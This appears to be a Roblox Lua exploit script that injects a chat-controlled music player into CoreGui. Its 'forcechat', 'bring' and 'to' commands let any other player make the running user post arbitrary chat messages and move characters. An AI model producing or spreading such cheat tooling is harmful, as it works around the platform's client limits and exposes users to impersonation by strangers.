local song = Instance.new("Sound",game.CoreGui)
song.Looped = true
song.Volume = 2
song.Name = "SniperSong"

local function SyncSong(msg,plr)
    if string.sub(msg,1,3) == "/e " then msg = string.sub(msg,4) end
    if string.sub(msg,1,1) == "!" then
        --First Check
        local msg2 = string.sub(msg,2)
        local args = msg2:split(" ")
        if args[1] == "play" then
--            print(string.sub(args[2],1,17)) warn(string.sub(args[2],18))
            if string.sub(args[2],1,17) == "roblox.com/games/" then
                args[2] = string.sub(args[2],18)
            end
            song.SoundId = "rbxassetid://" .. args[2]
            song:Play()
        elseif args[1] == "stop" then
            song:Stop()
        elseif args[1] == "volume" then
            song.Volume = tonumber(args[2])
        elseif args[1] == "speed" or args[1] == "pitch" then
            song.PlaybackSpeed = tonumber(args[2])
        elseif args[1] == "forcechat" and plr ~= game.Players.LocalPlayer then
            local MessageSender = require(game.Chat.ChatScript.ChatMain.MessageSender)
            MessageSender:RegisterSayMessageFunction(game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest)
            MessageSender:SendMessage(string.sub(msg,12), "All")
        elseif args[1] == "bring" and plr ~= game.Players.LocalPlayer then
            plr.Character:MoveTo(game.Players.LocalPlayer.Character.HumanoidRootPart.Position)
        elseif args[1] == "to" and plr ~= game.Players.LocalPlayer then
            game.Players.LocalPlayer.Character:MoveTo(plr.Character.HumanoidRootPart.Position)
        end
    end
end

for i,v in pairs(game.Players:GetPlayers()) do
    v.Chatted:Connect(function(msg)
        SyncSong(msg,v)
    end)
end

game.Players.PlayerAdded:Connect(function(v)
    v.Chatted:Connect(function(msg)
        SyncSong(msg,v)
    end)
end)
